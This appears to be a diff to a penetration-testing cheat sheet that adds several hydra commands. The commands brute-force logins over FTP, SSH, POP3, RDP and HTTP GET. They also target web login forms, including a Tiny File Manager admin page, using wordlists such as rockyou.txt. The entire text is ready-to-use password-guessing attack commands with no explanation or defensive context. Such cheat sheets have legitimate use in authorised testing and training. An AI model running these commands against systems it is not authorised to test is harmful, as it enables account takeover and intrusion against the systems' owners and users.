@@ -3,3 +3,14 @@ hydra -L "$USERS" -P "$WORDLIST" "$TARGET" smb
 hydra -l "$USER" -P "$WORDLIST" "$TARGET" ftp
 hydra -l "$USER" -P "$WORDLIST" http-post-form "$URL:user=^USER^&pass=^PASS^:Invalid"
 hydra -l "$USER" -P "$WORDLIST" "$TARGET" rdp
+hydra -l "$USER" -P /usr/share/wordlists/rockyou.txt ftp://"$IP"
+hydra -L users.list -P passwords.list ftp://"$IP":"$PORT" -t 48
+hydra -L users.txt -P passwords.txt ssh://"$IP"
+hydra -L users.txt -p "$PASSWORD" -f "$IP" pop3
+hydra -L usernames.txt -p "$PASSWORD" "$IP" rdp
+hydra -L users.txt -P passwords.txt "$IP" http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
+hydra -l "$USER" -P `fzf-wordlists` http://"$TARGET" http-post-form "/path:name=^USER^&password=^PASS^&enter=Sign+in:F=incorrect" -V
+hydra -L users.txt -P `fzf-wordlists` http://"$TARGET" http-get
+hydra -l admin -P `fzf-wordlists` http://"$TARGET" http-post-form "/tiny/tinyfilemanager.php:fm_usr=admin&fm_pwd=^PASS^:Login failed"
+hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f "$IP" -s "$PORT" http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
+hydra -l "$USER" -P passwords.txt -s "$PORT" -f "$TARGET" http-get /admin
